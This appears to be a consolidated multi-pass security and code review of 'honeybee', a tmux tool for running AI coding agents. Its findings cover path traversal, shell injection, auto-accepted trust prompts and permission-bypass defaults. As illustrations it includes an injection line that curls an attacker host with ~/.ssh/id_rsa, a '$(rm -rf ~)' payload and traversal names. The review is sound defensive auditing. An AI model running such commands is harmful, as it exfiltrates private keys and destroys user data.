# Honeybee (hive) — Consolidated Deep Code Review

## deep_review_findings_316210fcd3

**Date**: 2026-05-28  
**Scope**: Current working tree plus untracked files. No upstream or `origin/main` merge base was configured, so this pass reviewed the repository state directly. Subagents were not spawned because the available subagent tool requires an explicit subagent request, and this request only asked for a deep review.

### Findings

#### P1 — Swarm spawns happen before the swarm record is validated

**Locations**: `src/cli.ts:194-203`, `src/cli.ts:221-242`, `src/swarm.ts:55-60`

`spawnHomogeneousSwarm` and `spawnFromFrame` start all tmux sessions and write their session records before calling `createSwarm`. If `createSwarm` then rejects, for example because `--swarm-id` already exists, the CLI exits with an error after leaving live bees behind whose `swarmId` points at a swarm record that was not created for them. This is especially risky with explicit `--swarm-id`, because the new bees can be indistinguishable from members of an existing swarm in later selector operations.

**Fix direction**: Preflight the swarm id before spawning, preferably by validating `validSwarmId` and checking `loadSwarm(swarmId)` before the first `spawnBee`. If any later spawn fails, clean up already-created bees or avoid creating the swarm cohort until a rollback strategy exists.

#### P1 — Frame names are not validated before path construction, allowing store path traversal

**Locations**: `src/frame.ts:44-48`, `src/frame.ts:78-83`, `src/frame.ts:165-166`, `src/cli.ts:833-845`

`loadFrame`, `removeFrame`, and `frameFilePath` accept arbitrary names from CLI commands without applying `validFrameName`. A command such as `hive frame remove ../colonies/demo` resolves through `join(root, "frames", "../colonies/demo.json")` and can delete another store record. `loadFrame` has the same path-construction problem and can read/import files outside the frame directory if they match the derived `.json` or `.ts` path.

**Fix direction**: Validate frame names at every public frame API boundary (`loadFrame`, `removeFrame`, `frameFilePath`, and CLI handlers), not only during `defineFrameFromFile`. Reject names that fail `FRAME_NAME_RE` before touching the filesystem.

#### P2 — TypeScript frame rename succeeds but creates an unusable frame

**Locations**: `src/frame.ts:63-73`, `src/frame.ts:91-102`, `src/frame.ts:135-147`

`defineFrameFromFile` supports `nameOverride`, but for `.ts` frames it only copies the source file and does not normalize the exported `name`. If a user runs `hive frame define renamed original.ts`, the command succeeds and writes `renamed.ts`, but future `loadFrame("renamed")` validates the module default against the filename and fails when the export still says `original`. Separately, packaged `node dist/cli.js` cannot load `.ts` modules without a loader, so `.ts` frames are only usable under `tsx` despite being accepted by the CLI.

**Fix direction**: Either restrict persisted frames to JSON, or store TS frames with a generated wrapper/metadata file that supplies the registered name and a supported runtime loading path. At minimum, reject `nameOverride` for `.ts` frames and document that `.ts` loading is development-only.

#### P2 — Seal filenames can collide within one millisecond and overwrite prior seals

**Locations**: `src/seal.ts:109-115`, `src/seal.ts:171-173`, `src/cli.ts:598-607`

`recordSeal` uses `new Date().toISOString()` both as the logical seal time and the filename. Two seals for the same bee in the same millisecond compute the same path, so the later write overwrites the earlier seal. `waitForSeal` also compares only `sealedAt` against the baseline, so a collision with the same timestamp can be missed as "not new".

**Fix direction**: Add a unique suffix to seal filenames, such as a random or monotonic id, while keeping `sealedAt` as metadata. For waiting, compare a stable unique seal id/path rather than only the timestamp.

#### P2 — Destroying a swarm kills by mutable `swarmId` metadata instead of the swarm record membership

**Locations**: `src/cli.ts:908-920`, `src/swarm.ts:7-15`

`swarmDestroy` loads the swarm record but ignores its `beeIds`; it kills every session whose mutable session metadata has `swarmId === cleaned`. If an earlier failed duplicate spawn, manual metadata edit, or future bug leaves an unrelated session with that `swarmId`, `hive swarm destroy` will kill it even though it is not in the swarm record.

**Fix direction**: Treat `SwarmRecord.beeIds` as the authority. Resolve sessions by `record.id ?? record.name` membership in `swarm.beeIds`, and optionally report extra sessions that claim the same `swarmId` without killing them automatically.

### Verification

- `npm run check` passed.
- `npm test` passed: 112 tests.

---

**Date**: 2026-05-28  
**Review method**: Local deep review + multiple parallel subagent reviews (architecture, correctness/runtime, security/reliability, code quality/types, test coverage).  
**Sources synthesized**:
- Original full codebase exploration (all 6 src modules, tests, PRD, stress reports, runtime experiments)
- `CODE_REVIEW.md` (local + 3 subagents)
- `CODE_REVIEW_MULTIAGENT.md` (5 parallel specialized agents)
- Historical bug reports (`stress-reports/codex-home-auth-bug-2026-05-17.md` and others)

This document is the single authoritative consolidation of all findings. It prioritizes by actual risk and user impact.

---

## Executive Summary

**Overall score: 6/10** (improved from earlier 6.5 only after surfacing injection and fall-through execution risks).

honeybee is a pragmatic, zero-runtime-dependency tmux cockpit for interactive AI coding agents. It excels at the hard problem of durable session management + post-hoc transcript extraction from provider stores. The ID system, transcript scoring, and safe paste-buffer input are genuinely strong engineering.

However, the implementation contains several **critical correctness and security issues** (command injection surface, dangerous fall-through execution of user prompts into raw shells, auto-accept of trust prompts, and unsafe default "yolo" modes) plus deep structural debt (god module, massive duplication, lack of any agent abstraction, unsafe JSON handling, and concurrency races on the only persistent state).

The tool is currently safe only for closely monitored, single-user, low-parallelism workflows. It is not yet ready as a reliable building block for broader automation.

**Highest-risk areas** (in rough order):
1. Shell command construction + trusted HIVE_*_CMD execution through tmux.
2. Fall-through behavior that can paste arbitrary prompts into a raw shell.
3. Auto-accept of trust/safety prompts.
4. Default launch of agents in full-permission/yolo mode.
5. `hive run --wait` killing still-working sessions.
6. Multiple read-modify-write races on `~/.hive` state.

---

## Critical Findings (P0–P1)

### 1. Shell command injection via `tmux new-session` + trusted HIVE_*_CMD (Highest severity)
**Primary locations**: `src/tmux.ts:24` (newSession), `src/agents.ts:48-64` (shellCommand + resolveAgent), `src/cli.ts:85`

The constructed `command` string (including `HIVE_*_CMD` / legacy `AP_*_CMD` values and user `--` extra args) is passed as a single argument to `tmux new-session`. tmux invokes the user's `$SHELL -c` on this string.

Because `resolveAgent` treats the entire value of `HIVE_FOO_CMD` as trusted shell syntax (then only does light quoting), a compromised or malicious parent environment can inject:

```sh
HIVE_CLAUDE_CMD='claude; curl https://attacker.com/exfil?$(cat ~/.ssh/id_rsa)' hive spawn claude
```

**Risk**: Arbitrary command execution in the context of the user running hive.

**Contributing factors**:
- No separation between "the binary + args" and "shell preamble".
- `splitShellWords` is a partial parser, not a security boundary.
- Environment variable overrides are explicitly documented as a power-user feature.

**Recommended fix**: Create the tmux session first with a safe placeholder, then use `execFile` (argv array, no shell) to start the actual agent process inside the pane. Treat `HIVE_*_CMD` strictly as `argv[0] + argv[1..]` (never as shell syntax).

### 2. Prompt paste into raw shell on agent-ready timeout / failure (High severity)
**Locations**: `src/cli.ts:189-217` (`waitForAgentReady`), `src/tmux.ts:27-31` (`sendText`), `src/cli.ts:215` (fall-through comment)

`waitForAgentReady` has an explicit "fall through rather than fail" policy after timeout. If the agent never prints a recognized ready prompt (or crashes), the code still proceeds to `sendText` + `sendEnter`.

Result: The user's full prompt is pasted into whatever is currently in the tmux pane — which may be a bare login shell, a crashed process, or a different TUI.

A prompt containing `$(rm -rf ~)` or `; curl ...` becomes a real shell command.

**Risk**: User data loss or remote execution when an agent fails to start in the expected way.

**Recommended fix**: Never fall through on readiness. Either fail the whole operation with a clear error + captured pane, or add a hard `--force-send` flag after showing the user what will be sent.

### 3. Trust / safety prompts are auto-accepted
**Location**: `src/cli.ts:197-201` (`isTrustPromptPane` + `waitForAgentReady`)

The matcher is broad:
```ts
/Do you trust the contents of this directory|Quick safety check: Is this a project|Enter to confirm|Press enter to continue/i
```

An `MCP server found` guard exists but is only consulted later in `isAgentReadyPane`. A trust/MCP warning pane can trigger an Enter before the code decides it is a blocker.

**Risk**: honeybee can silently bypass an interactive safety or directory-trust boundary for any `--cwd` the caller requests.

**Recommended fix**: Do not auto-accept trust prompts by default. Add an explicit `--trust` / `--accept-trust` flag (tied to the specific cwd or session). Make the matchers provider-specific and conservative.

### 4. Unsafe "yolo" / full-permission modes are the documented and coded defaults
**Location**: `src/agents.ts:22-31` (DEFAULT_COMMANDS)

Every major provider is launched with its most permissive flag set:
- claude: `--dangerously-skip-permissions`
- codex: `--dangerously-bypass-approvals-and-sandbox`
- etc.

This directly contradicts the PRD statement that "honeybee should not auto-approve destructive actions."

**Risk**: Any automation or new user following the examples/docs gets maximum-danger agents by default.

**Recommended fix**: Safe/default-permission commands should be the default. Add an explicit `--yolo` / `--dangerous` opt-in (or `HIVE_*_YOLO=1`). Keep the bypass examples only in documentation.

### 5. `hive run --wait` can kill still-working / quiet in-flight sessions
**Location**: `src/cli.ts:342-351`

After `waitForIdle` succeeds (pane + transcript stability for N ms), the session is killed unless `--keep` is passed. Stability detection does not (and cannot reliably) know whether the agent has truly finished its task vs. is still thinking or waiting for tools.

**Risk**: Partial or in-progress work is lost; the session record is deleted.

**Recommended fix**: Change the default to keep sessions. Add `--rm` / `--cleanup` for explicit destruction. Consider adding a stronger "agent signaled completion" signal path in the future.

### 6. Bee ID allocation and ledger writes are racy (multiple races)
**Locations**: `src/ids.ts:25-42` (allocateBeeIdentity + writeIndex), `src/store.ts:81-84` (appendLedger with `flag:"a"`)

- No locking around read-modify-write of `id-index.json`.
- `writeFile(..., {flag:"a"})` for ledger is not atomic for records larger than PIPE_BUF.
- Concurrent `hive` processes can corrupt the index or produce interleaved/corrupt JSONL lines.

**Risk**: Lost ID registrations, duplicate short IDs, and corrupted audit trail.

**Recommended fix**: Use a proper lockfile (or atomic rename) for the index. Consider a small library for safe append-only JSONL if ledger integrity matters.

---

## Major Structural & Quality Findings

### 7. No agent abstraction — logic scattered across many files
Agent-specific behavior (`isAgentReadyPane`, `hasTranscriptProvider`, `latestTranscript` dispatch, default commands, home env vars, droid yolo settings) is implemented with raw string comparisons and duplicated lists in at least 5 places.

Adding or modifying support for any bee requires coordinated changes and is extremely error-prone.

**Recommended fix**: Introduce a proper `AgentDriver` / `BeeAdapter` interface (or registry) with methods for readiness, transcript reading, defaults, etc.

### 8. `cli.ts` is a 500+ line god module
Owns custom argument parsing, every command, `waitForIdle` (complex polling + scoring + mutation), `waitForAgentReady` (UI automation), session resolution, and heuristics.

**Recommended fix**: Extract at minimum: `parse.ts`, `wait.ts`, `readiness.ts`.

### 9. Massive duplication in transcript handling
The four `latest*Transcript` and four `load*Transcript` functions are nearly identical (only root path, file filter, and loader differ). Scoring logic and mtime filtering are repeated.

**Recommended fix**: Parameterized loader + strategy or template approach.

### 10. Unsafe `as` casts and unvalidated JSON everywhere
`JSON.parse(...) as SomeType` is used on untrusted provider files and user-controlled session records with almost no runtime validation.

Corrupt or malicious files in `~/.claude`, `~/.codex`, or `~/.hive` can produce garbage or crash the tool.

**Recommended fix**: Add lightweight shape guards or use a schema library at parse boundaries.

### 11. `sendText` silently splits multi-line prompts
Pasting text containing literal newlines + `sendEnter` causes the agent to receive multiple separate submissions.

**Recommended fix**: Either normalize newlines or document the limitation and provide a way to send literal multi-line blocks safely.

### 12. `SessionRecord` is an undifferentiated bag of 14+ optional fields
Conflates identity, lifecycle, transcript tracking, and last-prompt state. `status` can be undefined. Callers cannot trust the shape.

### 13. Inconsistent and incomplete error handling
Mix of `try/catch + ENOENT`, `.catch(() => null)`, bare `JSON.parse` (OpenCode), and silent fall-throughs. Failure modes are unpredictable.

### 14. Additional notable issues
- Session JSON files written with default umask (no `0o600` like `id-index.json`).
- `tmux.ts` mis-handles Node's `err.code` (string) vs numeric exit code → `exitCode` is always 1 on error.
- Dead/no-op code (`cli.ts:316`).
- Magic undocumented scoring weights (`+2000`, `+500`, `+200` etc.) with duplicated application.
- All devDependencies pinned to `"latest"` → non-reproducible builds.
- Module-level constants in `store.ts` evaluated at import time → hard to test safely.
- `hasTranscriptProvider` and provider lists duplicated between `cli.ts` and `transcripts.ts`.
- Unbounded growth of `ledger.jsonl` with no rotation.
- `transcriptPath` stored in sessions can be used for path-traversal reads if the record is tampered with.
- Minor off-by-one / no-op in `capture` (`Math.max(0, lines)`).

---

## Test Coverage & Quality

| Module          | Lines (approx) | Tests | Verdict |
|-----------------|----------------|-------|---------|
| `cli.ts`        | 510            | 0     | No coverage of parser, wait logic, readiness heuristics |
| `store.ts`      | 96             | 0     | No coverage of CRUD, legacy fallback, races |
| `tmux.ts`       | 56             | 0     | No coverage |
| `transcripts.ts`| 400            | 1     | Only synthetic Grok path; other 3 providers + scoring untested |
| `agents.ts`     | 160            | 1     | Currently failing (grok2 alias); `splitShellWords` untested |
| `ids.ts`        | 132            | 3-4   | Best coverage; uses temp dirs + deterministic UUIDs |

**Critical untested surfaces**:
- `parse()` (every command depends on it)
- `isAgentReadyPane()` + all the regex ladders
- `splitShellWords()`
- `scoreTranscript()` and bestTranscript selection
- All error and timeout paths

**Testability blockers**:
- Most interesting functions are not exported.
- Store root evaluated at import time.
- Droid settings write to a hardcoded `~/.factory` path.

`npm run check` does not type-check `tests/`.

---

## Operational / UX / Migration Issues

- Documented `HIVE_*_CMD` examples with `~` do not work (literal `~` is passed).
- `hive list` always emits ANSI bold escapes (pollutes scripts/pipes).
- Removing the `ap` binary is a breaking change for anyone with scripts or muscle memory; no deprecation shim.
- No `NO_COLOR` / TTY awareness for colored output.
- Rename from "agentpit" left behind `AP_*` env vars, comments, and the public `ap` bin removal.

---

## What Is Good

- Zero runtime dependencies — outstanding supply-chain posture.
- `ids.ts` tests are high quality (temp directories, deterministic factories).
- Transcript scoring with `matchedBy` audit trail is thoughtful.
- Use of tmux set-buffer/paste-buffer for prompt delivery is the right primitive.
- Strong legacy support for the `.agentpit` → `.hive` rename.
- Real-world stress testing data exists (even if gitignored).
- Clean async/await style and consistent error-throwing for user CLI errors.

---

## Prioritized Recommendations

### Immediate (address before trusting for any automation)

1. **Eliminate the shell injection surface** (Finding 1) — never pass user-controlled strings through `$SHELL -c` for the initial agent command.
2. **Remove or harden the readiness fall-through** (Finding 2) — never paste prompts into an unknown pane state.
3. **Stop auto-accepting trust/safety prompts** by default (Finding 3).
4. **Make safe agent modes the default** (Finding 4) and require opt-in for yolo.
5. **Change `hive run --wait` default behavior** so it does not destroy in-flight work (Finding 5).
6. **Add proper locking** for `id-index.json` and consider safe append for the ledger (Finding 6).

### High Priority (structural fixes)

7. Introduce an `AgentDriver` interface to kill the scattered if-ladders and duplication.
8. Split the god module (`cli.ts`).
9. Add runtime shape validation or schema parsing for all external JSON.
10. Export the pure/logic functions so they can be unit tested.
11. Add a real integration test harness (fake agent + controlled tmux) that covers happy + error + timeout paths.
12. Add CI (at minimum build + test + typecheck of tests) + linting/formatting.

### Medium / Polish

- Fix the `~` expansion bug in documented env overrides.
- Make `hive list` respect TTY / `NO_COLOR` (or add `--plain`).
- Add a deprecation shim for the old `ap` binary name.
- Bound ledger growth or add rotation.
- Clean up the minor bugs (tmux exit code, dead code, magic numbers, permissions).

---

## Verification Performed

During the combined reviews the following were executed:
- `npm run check`
- `npm test` (one failure observed)
- `npm run build`
- `npm audit`
- Manual runtime experiments with tmux new-session command construction
- Full source + test + documentation + stress-report reading

---

**This document now contains every significant finding surfaced across all participating agents and the primary deep review.** Earlier separate artifacts (`CODE_REVIEW_MULTIAGENT.md` and prior versions) can be treated as historical source material.

The highest-leverage work is fixing the execution safety issues (#1–4) and adding a minimal agent abstraction + test coverage for the complex control logic. The rest is important maintainability debt that will slow down any future evolution of the tool.

---

## review_findings_ace9de09b3

**Date**: 2026-05-28
**Method**: Local deep review of the live working tree, with prior review docs treated as historical context. The older high-severity findings about shell command injection, default yolo mode, readiness fall-through, private session file permissions, and unlocked ID/ledger writes appear to have been addressed in the current code.
**Verification**: `npm run check` passed. `npm test` passed: 112 tests.

### Findings

#### P1: Failed swarm/frame spawns can leave orphaned or misclassified live bees

Locations: `src/cli.ts:194`, `src/cli.ts:202`, `src/cli.ts:220`, `src/cli.ts:241`

`spawnHomogeneousSwarm` and `spawnFromFrame` start all tmux sessions and write each bee's session record before creating the swarm registry entry. If a later spawn/brief fails, or if `createSwarm` fails because an explicit `--swarm-id` already exists, the command exits after leaving already-started bees running. Those records can already contain `swarmId`, so they either point at a swarm record that was never created or contaminate an existing swarm selector.

Fix direction: validate/reserve the swarm id before starting bees, or create a pending swarm record first and update it after successful spawn. Also wrap the spawn loop in cleanup/rollback so any bees started by a failed command are killed and their session records removed unless the user explicitly asks to keep partial work.

#### P2: TS frame name overrides are returned as if they worked, but cannot be loaded later

Locations: `src/frame.ts:63`, `src/frame.ts:67`, `src/frame.ts:71`, `src/frame.ts:72`

`defineFrameFromFile` supports `nameOverride` for both JSON and TS sources and returns `{ ...draft, name: finalName }`. For JSON, it rewrites the copied file with the canonical name. For TS, it only copies the original module. If the TS module's default export still declares the old `name`, later `loadFrame(finalName)` calls `validateFrame(..., finalName)` and rejects the stored frame for a name mismatch. Users can successfully define a TS frame under an override, then find that `hive frame list/inspect` and `hive spawn --frame` cannot use it.

Fix direction: reject `nameOverride` for TS frames unless the exported frame already has that name, or store normalized frame metadata separately instead of relying on the copied TS module to declare the override.

#### P2: OpenCode transcript rendering can return messages in filesystem order, not conversation order

Locations: `src/transcripts.ts:288`, `src/transcripts.ts:291`, `src/transcripts.ts:298`, `src/transcripts.ts:300`

`readOpenCodeRows` iterates `readdir()` results for both messages and parts without sorting by timestamp, filename, or part ordering metadata. Directory iteration order is not a stable conversation order, so `renderTranscript` and `lastAssistantText` can show the wrong final assistant message or scramble multi-part content when the filesystem returns entries out of sequence.

Fix direction: load message metadata first, sort messages by their provider timestamp or sequence field with a filename fallback, then sort parts by provider sequence/index or filename before joining text.

### Residual Risk

The review did not use subagents because the available multi-agent tool requires explicit user permission for subagents; a request for a deep review alone is not sufficient under the current tool policy.

---

## review_findings_20260528_72a94b45d5

**Date**: 2026-05-28
**Method**: Local deep code review plus three independent review agents, scoped to the current dirty worktree against `HEAD` because this branch has no upstream/origin base.
**Verification**: `npm run check` passed. `npm test` passed: 112 tests.

### Findings

#### P1: Frame names can escape the frame store and delete/import arbitrary files

Locations: `src/frame.ts:44`, `src/frame.ts:78`, `src/frame.ts:165`

`loadFrame()` and `removeFrame()` pass raw user-controlled frame names into `frameFilePath()`, which joins the name under `~/.hive/frames` without validating it. A command like `hive frame remove ../../victim` resolves outside the frame store and attempts to remove `~/victim.ts` and `~/victim.json`. The same path construction lets `frame inspect` / `spawn --frame` import TS modules outside the managed frame directory.

Fix direction: validate every frame name with `validFrameName()` before constructing paths, reject path separators and `..`, and defensively assert the resolved target remains inside `framesDir()`.

#### P1: Global transcript lookup can leak another workspace's Codex transcript

Locations: `src/transcripts.ts:83`, `src/transcripts.ts:91`, `src/transcripts.ts:101`, `src/transcripts.ts:312`

`latestCodexTranscript()` scans all files under `~/.codex/sessions`, and `scoreTranscript()` gives every candidate a score from mtime plus a weak `since` match. If no candidate matches by explicit path, session id, prompt, or cwd, `bestTranscript()` can still return the most recent unrelated transcript. That means `hive last` or `hive wait --transcript` can show private content from another project.

Fix direction: for global provider stores, require at least one strong match (`path`, `session-id`, `prompt`, or exact `cwd`) before returning a transcript. Add a regression test with two recent Codex transcripts from different cwd values.

#### P1: Listing/completing frames executes stored TS frame code

Locations: `src/frame.ts:38`, `src/frame.ts:46`, `src/frame.ts:137`, `src/completion.ts:171`

`listFrames()` calls `loadFrame()` for every `.ts` frame, and `loadFrame()` dynamically imports the module. Because shell completion calls `listFrames()`, pressing tab can execute arbitrary frame code, hang completion, or mutate local state. Listing available frames should be metadata-only.

Fix direction: store normalized metadata at `frame define` time, or list frame names from filenames without importing TS. Only import TS modules for explicit execution/inspection paths where running code is expected.

#### P1: Failed swarm/frame spawns can leave orphaned or misclassified live bees

Locations: `src/cli.ts:194`, `src/cli.ts:202`, `src/cli.ts:220`, `src/cli.ts:241`

`spawnHomogeneousSwarm()` and `spawnFromFrame()` launch all tmux sessions and write bee session records before `createSwarm()` checks whether the swarm id is valid and unused. If `--swarm-id` already exists, or if a later spawn/brief step fails, the command exits with live sessions already tagged with that swarm id. Those bees either point at a swarm record that was never created or contaminate an existing `@swarm` selector.

Fix direction: preflight/reserve the swarm id before starting bees, or create a pending swarm record first and roll back started bees on failure.

#### P2: Relative executable preflight checks the wrong working directory

Location: `src/cli.ts:962`

`assertExecutableAvailable()` checks relative slash commands such as `./agent` relative to the current `hive` process cwd. The tmux session is launched with `-c opts.cwd`, so the runner resolves `./agent` relative to the requested bee cwd instead. This can reject a valid command in `--cwd`, or accept a different executable than the one the launched session will run.

Fix direction: pass the spawn cwd into the preflight and resolve relative slash commands against it, or remove this preflight and let the launcher surface spawn failures.

#### P2: TS frame name overrides succeed but create unusable frames

Locations: `src/frame.ts:63`, `src/frame.ts:67`, `src/frame.ts:71`, `src/frame.ts:72`

`defineFrameFromFile()` accepts `nameOverride` for TS frames and returns a frame with the overridden name, but it only copies the original TS module. Later `loadFrame(finalName)` validates the module's exported `name` against the filename and rejects it if the source still declares the old name. Users can define a renamed TS frame successfully, then fail to list, inspect, or spawn it.

Fix direction: reject `nameOverride` for TS frames unless the exported name already matches, or store normalized metadata/wrapper output for overridden TS frames. Add a TS override regression test.

#### P3: Tail follow flags are missing from completion

Location: `src/completion.ts:48`

`hive tail` and `hive cat` support `-f`, `--follow`, `--poll-ms`, and `--poll` through `parseTailOptions()`, but completion only advertises `-n` and `--lines`.

Fix direction: add the follow and polling flags to the `tail`/`cat` completion flag lists.

---

review_findings_d32f3bd48f:
  date: 2026-05-28
  scope: "Working tree against 5257576481632fff38eb26c466e5c9725210f943, including unstaged and untracked files."
  method: "Local deep review plus three independent explorer reviews."
  findings:
    - severity: P1
      location: "src/frame.ts:44, src/frame.ts:78, src/frame.ts:165"
      title: "Frame names can escape the frame store path"
      detail: "`loadFrame()` and `removeFrame()` pass raw CLI names into `frameFilePath()`. A name such as `../colonies/demo` resolves outside `~/.hive/frames`, so frame inspect/list paths can read or import outside the frame store and `hive frame remove` can delete sibling `.json` or `.ts` files."
      fix: "Validate names with `validFrameName()` at every public frame API boundary and/or assert resolved paths stay inside `framesDir()` before read, import, or delete."
    - severity: P1
      location: "src/frame.ts:38, src/frame.ts:46, src/completion.ts:171"
      title: "Listing and completing frames executes stored TS frame modules"
      detail: "`listFrames()` calls `loadFrame()` for every `.ts` frame, and shell completion calls `listFrames()`. Pressing tab or listing frames can run arbitrary frame module code, hang completion, or mutate local state."
      fix: "Keep metadata for listing/completion, or list names from filenames without importing TS. Only import TS frames on explicit inspect/spawn paths."
    - severity: P1
      location: "src/cli.ts:195, src/cli.ts:202, src/cli.ts:223, src/cli.ts:241"
      title: "Failed swarm or frame spawn leaves live orphaned bees"
      detail: "Multi-spawn launches and saves bee sessions before `createSwarm()` verifies that the swarm id can be created. Duplicate `--swarm-id`, later spawn failures, or brief delivery failures can leave live sessions tagged with a missing or existing swarm record."
      fix: "Preflight/reserve the swarm id and executables before spawning, and roll back already-created sessions on any later failure."
    - severity: P2
      location: "src/wait.ts:26, src/wait.ts:45"
      title: "`waitForIdle()` can report success after the tmux session dies"
      detail: "Pane capture failures are converted to an empty string. If the session exits after the initial `ensureLive()`, the empty fingerprint can stabilize and `waitForIdle()` returns successfully, logging `session.wait` instead of reporting a dead session."
      fix: "Recheck liveness on every poll or treat capture failure as a wait failure unless a specific transient case is being handled."
    - severity: P2
      location: "src/cli.ts:908, src/cli.ts:912"
      title: "`swarm destroy` trusts mutable session metadata over the registry"
      detail: "The command loads the swarm record but ignores `swarm.beeIds`, killing every session whose mutable `swarmId` equals the requested id. A stale or corrupted session record can be killed even if it is not in the swarm registry."
      fix: "Select members from `new Set(swarm.beeIds)` against `record.id ?? record.name`; report mismatched claimants separately."
    - severity: P2
      location: "src/cli.ts:134, src/cli.ts:962"
      title: "Relative executable preflight checks the wrong cwd"
      detail: "`assertExecutableAvailable()` validates `./agent` relative to the `hive` process cwd, but tmux launches the runner with the requested bee cwd. This can reject valid repo-local commands or validate a different executable than the one that will run."
      fix: "Resolve relative slash commands against the spawn cwd, or remove the preflight and surface launcher spawn errors."
    - severity: P2
      location: "src/frame.ts:63, src/frame.ts:67, src/frame.ts:71"
      title: "TS frame name overrides create unusable frames"
      detail: "`defineFrameFromFile()` accepts `nameOverride` for `.ts` frames and returns the overridden name, but it copies the source module unchanged. Later `loadFrame(finalName)` validates the module export against the filename and rejects it when the source still declares the old name."
      fix: "Reject TS name overrides unless the exported name already matches, or persist normalized JSON/wrapper metadata for overridden TS frames."
    - severity: P3
      location: "src/seal.ts:110, src/seal.ts:171"
      title: "Seal records can overwrite each other within the same millisecond"
      detail: "`sealedAt` is both the logical timestamp and the filename discriminator. Two seals for the same bee in the same millisecond write the same path; `waitForSeal()` also compares only the timestamp."
      fix: "Add a unique seal id or random/monotonic filename suffix, and have wait logic compare the unique id or path."
  verification:
    - "npm run check: passed"
    - "npm test: passed (112 tests)"
